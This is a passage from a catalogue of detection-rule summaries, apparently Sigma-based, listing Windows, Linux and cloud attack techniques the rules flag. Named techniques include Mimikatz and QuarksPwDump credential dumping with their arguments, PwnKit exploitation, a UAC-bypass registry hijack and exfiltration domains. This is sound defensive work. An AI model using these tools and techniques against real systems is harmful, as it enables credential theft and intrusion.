  Rule-Body-Hash: c064f990d6788cfb9e515ba925a100dd
  Ruleset: sigmahq
  Summary: This rule detects a potential credential dumping attempt where an attacker
    tries to add a new network provider in the Windows registry. This technique, similar
    to the behavior of the NPPSpy tool, involves modifying registry keys under specific
    paths commonly associated with network providers. The rule filters out known legitimate
    network provider paths and the system process "poqexec.exe" to reduce false positives.
    Recognizing these attempts can help identify malicious activities aiming to access
    clear text credentials.
  Updated-Date: '2024_09_04'
044ba588-dff4-4918-9808-3f95e8160606:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 40806cb8c591975e97c8bbea3aa4945c
  Ruleset: core
  Summary: This rule detects the use of the "copy" command in cmd.exe to copy files
    with ".dmp", ".dump", or ".hdmp" extensions from a remote share. This activity
    can be indicative of credential access attempts where memory dump files, which
    may contain sensitive information, are copied from a remote location.
  Updated-Date: '2024_09_03'
046218bd-e0d8-4113-a3c3-895a12b2b298:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: af0367ea8903f24c3adfc6f559a26048
  Ruleset: sigmahq
  Summary: This rule detects modifications to autostart extensibility points (ASEPs)
    in the Windows registry, particularly within keys related to the Session Manager
    such as `SetupExecute`, `S0InitialCommand`, `KnownDlls`, `Execute`, `BootExecute`,
    and `AppCertDlls`. These registry changes can indicate persistence mechanisms
    used by malware or legitimate software installations. The rule aims to identify
    alterations that could compromise system integrity by monitoring specific paths
    within the `\System\CurrentControlSet\Control\Session Manager` directory. Legitimate
    changes by authorized software or administrators may trigger false positives.
  Updated-Date: '2024_09_04'
04ad83ef-1a37-4c10-b57a-81092164bf33:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9f56136aa28174feb94a5399faf6d405
  Ruleset: sigmahq
  Summary: This rule detects when a repository or organization on GitHub is being
    transferred to another location. It triggers on specific actions within the audit
    logs, such as the creation of a migration file for data transfer, the transfer
    of an organization between enterprise accounts, and the transfer of a repository
    to another network. These activities are relevant for monitoring potential unauthorized
    changes or movements within GitHub environments.
  Updated-Date: '2024_09_04'
04b45a8a-d11d-49e4-9acc-4a1b524407a5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1996eb5516ae02e93c4ef4f6acfeb5d3
  Ruleset: sigmahq
  Summary: This rule detects when a user enables DNS-over-HTTPS. This can be utilized
    to conceal internet activity or the exfiltration of data. When DNS-over-HTTPS
    is enabled, an organization loses visibility into vital information such as query
    type, responses, and originating IP addresses that are essential for identifying
    malicious actors. The rule monitors specific registry changes related to Microsoft
    Edge, Google Chrome, and Mozilla Firefox to identify the activation of this feature.
  Updated-Date: '2024_09_04'
04e2a23a-9b29-4a5c-be3a-3542e3f982ba:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c593f6f536471ace73bbf75866edf9a9
  Ruleset: sigmahq
  Summary: This rule detects when an API access service account is granted domain
    authority within Google Workspace.
  Updated-Date: '2024_09_04'
0506a799-698b-43b4-85a1-ac4c84c720e9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 447739b2efb6b586880505b5eed35453
  Ruleset: core
  Summary: This rule detects potential exploitation of PwnKit, a local privilege escalation
    vulnerability identified as CVE-2021-4034, by examining authentication logs on
    Linux systems. It looks for specific keywords such as "pkexec" and unusual content
    in the XAUTHORITY environment variable, along with instances where the user is
    root and the terminal type is /dev/pts/0.
  Updated-Date: '2024_09_03'
05164d17-8e11-4d7d-973e-9e4962436b87:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c685c24fba37fbd9e30e4a30cd3f6d41
  Ruleset: emerging-threats
  Summary: This rule detects indicators of exploitation activities associated with
    the "SlashAndGrab" vulnerability in ScreenConnect, which is a remote support and
    access software. The detection focuses on specific file events in Windows environments,
    identifying filenames and directory paths that are indicative of post-exploitation
    behavior. Notable files include various .msi files, executables such as `LB3.exe`,
    `ta.exe`, `svchost.exe`, and different DLLs located in characteristic directories
    like `C:\Windows\Temp\ScreenConnect\`, `C:\ProgramData`, and others. Identifying
    these filenames and paths helps to uncover unauthorized activities indicative
    of the exploitation incident documented by Team Huntress.
  Updated-Date: '2024_09_03'
05296024-fe8a-4baf-8f3d-9a5f5624ceb2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0addc61a56366fb1db4862a0bee26a6b
  Ruleset: sigmahq
  Summary: This rule detects the loading of known malicious drivers on Windows systems
    by identifying their hash values. It includes a comprehensive list of MD5, SHA1,
    SHA256, and IMPHASH hashes that correspond to driver files recognized as malicious.
    The goal is to catch instances of unauthorized or harmful driver installations,
    which can facilitate privilege escalation, system instability, or other malicious
    activities.
  Updated-Date: '2024_09_04'
0531e43a-d77d-47c2-b89f-5fe50321c805:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 025bdd2c54420e173c730a3522957225
  Ruleset: sigmahq
  Summary: This rule detects the process "RegAsm.exe" initiating a network connection
    to public IP addresses. "RegAsm.exe" is a legitimate .NET assembly registration
    tool often exploited for malicious purposes, such as defense evasion. By monitoring
    this tool's network activities, particularly connections to public IP addresses,
    the rule aims to identify potentially unauthorized or suspicious network behavior
    associated with "RegAsm.exe".
  Updated-Date: '2024_09_04'
055fb148-60f8-462d-ad16-26926ce050f1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9e42701b52049b2a63c9d99e87cb171e
  Ruleset: core
  Summary: This rule detects activity when someone changes passwords on behalf of
    other users within AWS. Specifically, it identifies the use of the "iam:UpdateLoginProfile"
    permission, which allows an attacker to change the password for any user that
    already has a login profile set up.
  Updated-Date: '2024_09_03'
055fb54c-a8f4-4aee-bd44-f74cf30a0d9d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 58e76c6729b53301d77213fed340d589
  Ruleset: sigmahq
  Summary: This rule detects the execution of SharpMove, a .NET utility capable of
    performing various tasks such as task creation, querying the Service Control Manager
    (SCM), and executing VBScript using Windows Management Instrumentation (WMI).
    The detection is based on the presence of specific PE metadata and command-line
    options associated with SharpMove, including actions like creating tasks, executing
    VBScripts, modifying tasks, and querying services.
  Updated-Date: '2024_09_04'
056c7317-9a09-4bd4-9067-d051312752ea:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 22cf66b29ef7ced0eb7b19fc9358a9cc
  Ruleset: sigmahq
  Summary: This rule detects the execution of PowerShell commands from a headless
    ConHost process on Windows. The headless mode, indicated by the `--headless` flag,
    conceals the window from the user during execution. This behavior may be associated
    with techniques used for defense evasion and remote command execution, posing
    a potential security risk.
  Updated-Date: '2024_09_04'
058f4380-962d-40a5-afce-50207d36d7e2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e019afb18c6df17a551cb413b3800a37
  Ruleset: core
  Summary: This rule detects various execution patterns of the CrackMapExec pentesting
    framework, specifically looking for command line activities that suggest remote
    command execution, fileless output redirection to network shares or temporary
    directories, and obfuscated or non-obfuscated PowerShell commands. Key indicators
    include specific command line arguments used with `cmd.exe` and `powershell.exe`,
    which are characteristic of CrackMapExec's operation for performing remote code
    execution and evading detection. The detections leveraged include patterns like
    silent command execution and manipulating output redirection, typically associated
    with malicious administrative tasks on Windows systems.
  Updated-Date: '2024_09_03'
05936ce2-ee05-4dae-9d03-9a391cf2d2c6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6a1e7e20cc881447ab741199aea0b038
  Ruleset: core
  Summary: This rule detects the usage of WMI (Windows Management Instrumentation)
    command line event consumers by identifying instances where the `WmiPrvSE.exe`
    process loads the `wbemcons.dll` dynamic-link library, which is indicative of
    such activity. This can be a technique used for persistence in a system, particularly
    in Windows environments.
  Updated-Date: '2024_09_03'
059c5af9-5131-4d8d-92b2-de4ad6146712:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 080d6387324c49f061a71e9feb89cfcd
  Ruleset: core
  Summary: This rule detects the creation of the LiveKD driver by any process image
    other than "livekd.exe" or "livek64.exe". LiveKD is a utility used for examining
    live systems. The rule flags any occurrence where the LiveKD driver file, typically
    named "LiveKdD.SYS", is created, but the responsible process is not the expected
    LiveKD executables. This unusual driver creation behavior can indicate potential
    malicious activity involving defense evasion or privilege escalation.
  Updated-Date: '2024_09_03'
05a2ab7e-ce11-4b63-86db-ab32e763e11d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4f73a652b17d3c46bd4d6468c629e2d0
  Ruleset: core
  Summary: This rule detects when a Windows command line executable is initiated from
    the Microsoft Management Console (MMC). The monitored executables include common
    command-line tools and scripting utilities such as cmd.exe, powershell.exe, pwsh.exe,
    wscript.exe, cscript.exe, sh.exe, bash.exe, reg.exe, and regsvr32.exe, as well
    as the BITSADMIN command. This pattern of behavior can be indicative of lateral
    movement, a tactic often associated with attacks aimed at propagating across networked
    systems.
  Updated-Date: '2024_09_03'
05b2aa93-1210-42c8-8d9a-2fcc13b284f5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b5f8c076ecabd56e3cf925b20b2c3758
  Ruleset: core
  Summary: This rule detects the execution of "reg.exe" commands with the "delete"
    flag targeting service registry keys in Windows. Attackers commonly use this technique
    to remove antivirus software services, aiding in defense evasion.
  Updated-Date: '2024_09_03'
05b3e303-faf0-4f4a-9b30-46cc13e69152:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1dceb6f19114275a24b9d751d845e3fa
  Ruleset: sigmahq
  Summary: This rule detects calls to the "Add-Content" cmdlet in PowerShell intended
    to modify the user profile by potentially adding commands for persistence. It
    monitors for specific suspicious values within the script block, such as "IEX",
    "Invoke-Expression", "Invoke-WebRequest", and "Start-Process", which are often
    used in malicious activities to maintain persistent access.
  Updated-Date: '2024_09_04'
05c36dd6-79d6-4a9a-97da-3db20298ab2d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 89f2e75d56175041edc2621bdfa02b74
  Ruleset: sigmahq
  Summary: This rule detects the execution of WMIC.exe with the "format" flag to potentially
    load XSL files. Adversaries exploit this functionality to execute arbitrary files,
    possibly bypassing application whitelisting defenses. Extensible Stylesheet Language
    (XSL) files are typically used to describe the processing and rendering of data
    within XML files.
  Updated-Date: '2024_09_04'
05ebafc8-7aa2-4bcd-a269-2aec93f9e842:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1da2c78e2ec4373d2eaa0fc8936439d1
  Ruleset: sigmahq
  Summary: This rule detects the usage of the winget command-line tool to add new
    download sources on Windows systems. Winget is a Windows Package Manager that
    allows users to install, upgrade, and manage software packages. The rule triggers
    when the 'winget.exe' process is executed with command lines that contain both
    'source' and 'add,' which indicates an attempt to add a new download source. While
    legitimate use of this command exists, adding unauthorized or malicious sources
    can pose security risks, making it a potential indicator of defense evasion or
    malicious execution.
  Updated-Date: '2024_09_04'
05f3c945-dcc8-4393-9f3d-af65077a8f86:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: de58181e324e0b77ea3f99b697be6e04
  Ruleset: sigmahq
  Summary: This rule detects access to domain group policies stored in SYSVOL. Accessing
    this directory is notable because it can be related to credential access techniques
    where adversaries target Group Policy files, which might contain sensitive information.
    Such access can exist under legitimate administrative tasks, but it can also signal
    unauthorized or suspicious activity that requires investigation.
  Updated-Date: '2024_09_04'
060c3ef1-fd0a-4091-bf46-e7d625f60b73:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 63f81f10e1e9a9297c2650d6b0b5c7c1
  Ruleset: sigmahq
  Summary: This rule detects the use of the DSInternals PowerShell Module's Get-ADReplAccount
    command, which is often utilized for accessing internal features of Active Directory
    and Azure Active Directory. This includes functionalities such as auditing FIDO2
    and NGC keys, manipulating offline ntds.dit files, performing password audits,
    recovering Domain Controllers from IFM backups, and calculating password hashes.
  Updated-Date: '2024_09_04'
060d5ad4-3153-47bb-8382-43e5e29eda92:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ed54eea3732f4c9d6ac8e5c70dce5ef0
  Ruleset: sigmahq
  Summary: This rule detects the loading of unsigned modules by ClickOnce applications
    on Windows systems. It specifically monitors image load events within the '\AppData\Local\Apps\2.0\'
    directory where the signature status is either unsigned or expired. This behavior
    is associated with persistence techniques used by attackers, where they exploit
    ClickOnce for trusted code execution.
  Updated-Date: '2024_09_04'
06125661-3814-4e03-bfa2-1e4411c60ac3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b56f64c360d8f37a3b7c27c76d9781e1
  Ruleset: sigmahq
  Summary: This rule detects the deletion of files with extensions common to backup
    files, such as .VHD, .bac, .bak, .wbcat, .bkf, .set, .win, and .dsk, by processes
    including cmd.exe, powershell.exe, pwsh.exe, wt.exe, rundll32.exe, and regsvr32.exe.
    Adversaries may engage in such activities to delete or disable built-in operating
    system data and disable services intended to facilitate the recovery of a corrupted
    system, thereby hindering recovery efforts.
  Updated-Date: '2024_09_04'
065b00ca-5d5c-4557-ac95-64a6d0b64d86:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8bc9c69a53d39f63deb605569e0512ac
  Ruleset: core
  Summary: This rule detects the execution of AnyDesk, a legitimate remote access
    tool, from non-standard directories such as '\AppData\', 'Program Files (x86)\AnyDesk',
    and 'Program Files\AnyDesk'. This can indicate potential misuse by an adversary
    to establish a remote command and control channel within a network, circumventing
    standard security measures. AnyDesk is widely used for desktop support but can
    be exploited by attackers to gain unauthorized access.
  Updated-Date: '2024_09_03'
065cceea-77ec-4030-9052-fc0affea7110:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: af4985ebe8febbe82a9160f8c3cf43d4
  Ruleset: core
  Summary: This rule detects DNS queries for the domain "anonfiles.com" on Windows
    systems. Anonfiles.com is known as an anonymous file upload platform and is often
    exploited for malicious purposes, such as data exfiltration by threat actors.
    Monitoring such DNS queries can help in identifying potential malicious activities
    that involve using this platform.
  Updated-Date: '2024_09_03'
0685b176-c816-4837-8e7b-1216f346636b:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d369bffef39f58e6168edf3411f34515
  Ruleset: core
  Summary: This rule detects the execution of the Quarks PwDump tool by identifying
    specific command-line arguments associated with it. Quarks PwDump is a tool used
    for extracting password hashes from a Windows system, including local, domain-cached,
    and BitLocker hashes. The rule monitors for the presence of the `QuarksPwDump.exe`
    image and various command-line arguments such as `-dhl`, `--dump-hash-local`,
    `-dhdc`, `--dump-hash-domain-cached`, and others to flag potential misuse for
    credential access activities.
  Updated-Date: '2024_09_03'
06b401f4-107c-4ff9-947f-9ec1e7649f1e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 544e2b967f652c378c2bcc96c45be7ed
  Ruleset: sigmahq
  Summary: This rule detects the execution of "ftp.exe" using the "-s" or "/s" flags,
    which are indicative of a script-based file transfer. It also monitors any child
    processes spawned by "ftp.exe" to capture potential arbitrary command execution
    attempts. This behavior can be associated with both malicious activity and administrative
    automation, necessitating careful review to distinguish between the two.
  Updated-Date: '2024_09_04'
06ce37c2-61ab-4f05-9ff5-b1a96d18ae32:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 158062bb936041cda35b692067cb4988
  Ruleset: sigmahq
  Summary: This rule detects the use of the Windows Management Instrumentation Command-line
    (WMIC) tool to load scripting libraries, specifically by observing the execution
    of `wmic.exe` and the loading of `jscript.dll` or `vbscript.dll`. Threat actors
    can employ this technique to proxy execute code and circumvent application controls
    by leveraging the `/FORMAT` argument switch in WMIC to download and run XSL files
    containing scripts (e.g., JavaScript, VBScript). These activities can be indicative
    of attempts to evade defenses and execute unauthorized code on a Windows system.
  Updated-Date: '2024_09_04'
06d71506-7beb-4f22-8888-e2e5e2ca7fd8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d2b3e29644c6dfaa7c1c4e949ef44a2c
  Ruleset: core
  Summary: This rule detects the use of Mimikatz by identifying specific keywords
    associated with its activity in Windows Event Logs. Mimikatz is a tool commonly
    used by threat actors for credential dumping, lateral movement, and accessing
    system privileges. The rule checks for keywords such as 'dpapi::masterkey', 'kerberos::golden',
    'lsadump::', and 'sekurlsa::' among others, which are indicative of Mimikatz operations.
    To mitigate false positives, it excludes events triggered by Sysmon's FileStream
    events.
  Updated-Date: '2024_09_03'
0718cd72-f316-4aa2-988f-838ea8533277:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c297a00775cd7e450a39c900b24dc44b
  Ruleset: sigmahq
  Summary: This rule detects the use of the PowerShell cmdlet `Start-Process` with
    the `-PassThru` option and `-FilePath` parameter, indicating an attempt to start
    a process in the background. This behavior is associated with techniques used
    for defense evasion.
  Updated-Date: '2024_09_04'
071d5e5a-9cef-47ec-bc4e-a42e34d8d0ed:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fef930be46daac63e77800898ad5fc94
  Ruleset: core
  Summary: This rule detects the use of the `--cpu-priority` command line parameter,
    which is commonly associated with coin mining software. The rule monitors for
    the appearance of this parameter in various command-line arguments, particularly
    in a Linux environment using the auditd service. The detection helps identify
    potential cryptocurrency mining activities that may exploit system resources and
    escalate privileges. Although other tools might also use the `--cpu-priority`
    flag, the presence of this parameter is flagged due to its frequent use in coin
    miner configurations.
  Updated-Date: '2024_09_03'
07330162-dba1-4746-8121-a9647d49d297:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d4fd692dcb5fbddabcc3d87ec569eae9
  Ruleset: core
  Summary: This rule detects actions related to the disabling of AWS Config Service,
    specifically the deletion of a delivery channel or stopping of a configuration
    recorder. These actions are traced through CloudTrail logs with the event source
    'config.amazonaws.com'.
  Updated-Date: '2024_09_03'
074e0ded-6ced-4ebd-8b4d-53f55908119d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d576d0d8de6f2a4d8059946674cc0a27
  Ruleset: sigmahq
  Summary: This rule detects the execution of attacker-controlled `WsmPty.xsl` or
    `WsmTxt.xsl` files via `winrm.vbs`, and the use of a copied `cscript.exe` that
    may be renamed. The detection focuses on specific command line parameters containing
    'format:pretty' or its variations, and it verifies that the executable image originates
    from system folders while also containing the term 'winrm'. This combination of
    criteria helps identify potential bypasses of Application Whitelisting and execution
    of arbitrary unsigned code.
  Updated-Date: '2024_09_04'
07743f65-7ec9-404a-a519-913db7118a8d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 35e878f523d0ebe9efd28c71ed78690e
  Ruleset: core
  Summary: This rule detects changes to the registry key 'HKCU\Software\Classes\Folder\shell\open\command\DelegateExecute',
    specifically focusing on attempts to perform a COM hijack via the Sdclt.exe utility.
    This method is known to be used for privilege escalation by bypassing User Account
    Control (UAC), as highlighted in online resources and exploit databases.
  Updated-Date: '2024_09_03'
07837ab9-60e1-481f-a74d-c31fb496a94c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fd7d7394f2b795a1aa5ac578b8dbcafb
  Ruleset: sigmahq
  Summary: This rule detects an executable accessing the portmap.io domain, which
    could indicate forbidden command and control (C2) traffic or data exfiltration
    activities by malicious actors.
  Updated-Date: '2024_09_04'
0785f462-60b0-4031-9ff4-b4f3a0ba589a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f8ee16ee7a717e2d4fca25fa824530d0
  Ruleset: emerging-threats
  Summary: "This rule detects filename patterns associated with email-related data\
    \ used by the UNC4841 threat group for staging and exfiltration activities. The\
    \ surveillance focuses on files in the `/mail/tmp/` directory with names matching\
    \ a specific pattern\u2014three alphabetic characters followed by three numeric\
    \ characters and ending with `.tar.gz`. This pattern is associated with UNC4841's\
    \ methods for preparing and transmitting stolen email data. This detection is\
    \ applied to file events in Linux environments to identify potential malicious\
    \ operations linked to this threat actor."
  Updated-Date: '2024_09_03'
07a99744-56ac-40d2-97b7-2095967b0e03:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5d9cf3fef55eaf78af122707f445324d
  Ruleset: core
  Summary: This rule detects a potential privilege escalation attempt through the
    creation of a "*.Exe.Local" folder within the "System32" directory, specifically
    to sideload the "comctl32.dll" file. The technique involves targeting critical
    system executables such as "logonUI.exe," "werFault.exe," "consent.exe," "narrator.exe,"
    and "wermgr.exe" to gain elevated privileges by loading a malicious version of
    the DLL.
  Updated-Date: '2024_09_03'
07aa184a-870d-413d-893a-157f317f6f58:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e5d8399ae3c169d02dde412dcc1b07d4
  Ruleset: core
  Summary: This rule detects the execution of a built-in Windows script located at
    "C:\Windows\System32\gatherNetworkInfo.vbs" which is utilized to gather information
    about the target machine. This activity is often associated with reconnaissance
    efforts by malicious actors to understand the network environment. The detection
    focuses on the presence of this script in the command line while filtering out
    specific scripting host executables like 'cscript.exe' and 'wscript.exe'.
  Updated-Date: '2024_09_03'
07ad2ea8-6a55-4ac6-bf3e-91b8e59676eb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1265d3c3682c4ee736bddf831bab9405
  Ruleset: core
  Summary: This rule detects the execution of obfuscated PowerShell scripts that utilize
    MSHTA to run malicious commands. MSHTA (Microsoft HTML Application) is used in
    conjunction with VBScript to execute potentially harmful payloads. The detection
    focuses on scripts containing specific keywords such as 'set', '&&', 'mshta',
    'vbscript:createobject', '.run', and '(window.close)'. This rule is important
    for identifying actions related to defense evasion and execution techniques often
    employed by attackers.
  Updated-Date: '2024_09_03'
07bdd2f5-9c58-4f38-aec8-e101bb79ef8d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4f9d7ea638c0e4cd3151898ad8c36f98
  Ruleset: core
  Summary: This rule detects the deletion of registry keys that contain the Microsoft
    Terminal Services Client (MSTSC) connection history. The activity involves monitoring
    for events where values or keys under the registry paths `\Microsoft\Terminal
    Server Client\Default\MRU` and `\Microsoft\Terminal Server Client\Servers\` are
    deleted. The rule is designed to identify potential defense evasion techniques
    such as attempts to obscure past Remote Desktop Protocol (RDP) connections, which
    could indicate malicious activities or intrusions.
  Updated-Date: '2024_09_03'
07db928c-8632-488e-ac7d-3db847489175:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5eb2c82ad1b2c92c1957b4fb03064184
  Ruleset: emerging-threats
  Summary: This rule detects the execution of specific processes and command line
    combinations associated with the Forest Blizzard Advanced Persistent Threat (APT)
    group, as described by Microsoft. The detection focuses on particular hash values,
    the creation and deletion of scheduled tasks through `schtasks.exe`, and specific
    PowerShell command sequences. The scheduling tasks involve running batch files
    like `servtask.bat`, `execute.bat`, and `doit.bat` under the SYSTEM user account,
    within the path `\Microsoft\Windows\WinSrv`. Additionally, the rule monitors PowerShell
    commands that use `Get-ChildItem` to list items, `.save` files, and `Compress-Archive`
    to create zip archives in the `C:\ProgramData\` directory.
  Updated-Date: '2024_09_03'
07e3cb2c-0608-410d-be4b-1511cb1a0448:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2e8c2b7038a63c20d3138a81bdda3794
  Ruleset: core
  Summary: This rule detects attempts to tamper with Windows Defender configurations
    by using the 'Remove-MpPreference' cmdlet. It specifically monitors for commands
    that include options like '-ControlledFolderAccessProtectedFolders', '-AttackSurfaceReductionRules_Ids',
    '-AttackSurfaceReductionRules_Actions', and '-CheckForSignaturesBeforeRunningScan',
    which are indicative of efforts to alter security settings.
  Updated-Date: '2024_09_03'
07e97cc6-aed1-43ae-9081-b3470d2367f1:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b0380f01fdbf62832e336f80680bbc24
  Ruleset: core
  Summary: This rule detects when an Okta end-user reports their account activity
    as potentially suspicious, providing an alert for possible unauthorized access
    or other security concerns.
  Updated-Date: '2024_09_03'
07f8bdc2-c9b3-472a-9817-5a670b872f53:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2ba118f9eb6dd3a08036c5b869310434
  Ruleset: core
  Summary: This rule detects the use of cmdkey.exe to search for cached credentials
    on a Windows system. It specifically looks for instances where the executable
    cmdkey.exe is run, as identified by its image or original filename, and includes
    command-line parameters that involve listing credentials. This activity might
    indicate attempts at reconnaissance or credential dumping, which could be part
    of a privilege escalation effort. False positives may occur during legitimate
    administrative tasks.
  Updated-Date: '2024_09_03'
08200f85-2678-463e-9c32-88dce2f073d1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 52693e18a8974e0cd0cb359d3f4ee60e
  Ruleset: core
  Summary: This rule detects attempts to compromise an MSSQL server by adding a backdoor
    account to the sysadmin fixed server role. It monitors Windows application logs
    for specific events related to changes in the sysadmin role, which is a critical
    administrative function. Such activity might indicate an attacker trying to establish
    persistence by gaining high-level access to the SQL server.
  Updated-Date: '2024_09_03'
08249dc0-a28d-4555-8ba5-9255a198e08c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6a19e50e1359f4a986f0c7b6cd11b2a5
  Ruleset: sigmahq
  Summary: This rule detects when a script interpreter, specifically Wscript or Cscript,
    initiates a local network connection to download or execute a script hosted on
    a shared folder. It monitors network connections that are triggered by these interpreters
    and examines specific IP ranges, including both IPv4 and IPv6 addresses, that
    are typically used for local networks. This activity is noted as a potential indicator
    of command-and-control tactics used by attackers.
  Updated-Date: '2024_09_04'
086ae989-9ca6-4fe7-895a-759c5544f247:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 87fd2ad8661df863a5551c3b5a574c78
  Ruleset: core
  Summary: This rule detects modifications or additions to the 'TypedPaths' key in
    the user or admin registry from non-standard applications, which could indicate
    an attempt at persistence. The rule specifically looks for any process making
    changes to the registry key '\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths\'
    except for processes originating from 'C:\Windows\explorer.exe' or 'C:\Windows\SysWOW64\explorer.exe'.
  Updated-Date: '2024_09_03'
087790e3-3287-436c-bccf-cbd0184a7db1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2603a6c3fb38b277d7ff939e569b05ba
  Ruleset: core
  Summary: This rule detects potential path traversal attempts via cmd.exe on Windows
    systems. It identifies the use of specific command-line flags such as /c, /k,
    and /r that could indicate command or argument confusion and hijacking. The focus
    is on cmd.exe processes exhibiting path traversal patterns, such as the use of
    '/../../'. Java tools that load libraries in this manner are known to produce
    false positives.
  Updated-Date: '2024_09_03'
089fc3d2-71e8-4763-a8a5-c97fbb0a403e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 60b5142390e72b2f2c67e7bc45e66f6c
  Ruleset: core
  Summary: This rule detects the execution of REGSVR32.exe, a legitimate Windows utility
    used for registering and unregistering DLL files, when it is used with DLL files
    that have suspicious file extensions. Such extensions might include common image,
    document, or temporary file types, like .jpg, .png, .txt, .tmp, among others,
    which are typically not associated with DLL files. This behavior may indicate
    an attempt to disguise malicious DLL files. The rule aims to identify potential
    defense evasion tactics where attackers might use non-standard file extensions
    to bypass security measures.
  Updated-Date: '2024_09_03'
08d6ac24-c927-4469-b3b7-2e422d6e3c43:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 39223c46ae289880bccda35838a740d4
  Ruleset: sigmahq
  Summary: This rule detects when an Azure Kubernetes network policy is modified or
    deleted, which could indicate potential unauthorized changes or breaches. The
    operations to monitor include writing and deleting network policies under specific
    namespaces and resources. As network policy changes can also be performed by legitimate
    system administrators, it is essential to verify the identity and legitimacy of
    the user making these changes to rule out false positives. Suspicious modifications
    or deletions by unfamiliar users should be thoroughly investigated to ensure the
    security of the containerized environment.
  Updated-Date: '2024_09_04'
08f26069-6f80-474b-8d1f-d971c6fedea0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1c0dfb6f27a5cf76bbcaeb087d4a6909
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "userdel" binary, which is used
    to delete a user account and related files on a Linux system. Threat actors can
    abuse this command to remove user accounts as a way to cover their tracks.
  Updated-Date: '2024_09_04'
0900463c-b33b-49a8-be1d-552a3b553dae:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e5291070464e44aecfdc90918dfbc806
  Ruleset: sigmahq
  Summary: This rule detects the use of the "::$index_allocation" stream in command
    lines, which can be employed to hide directories or files, thereby preventing
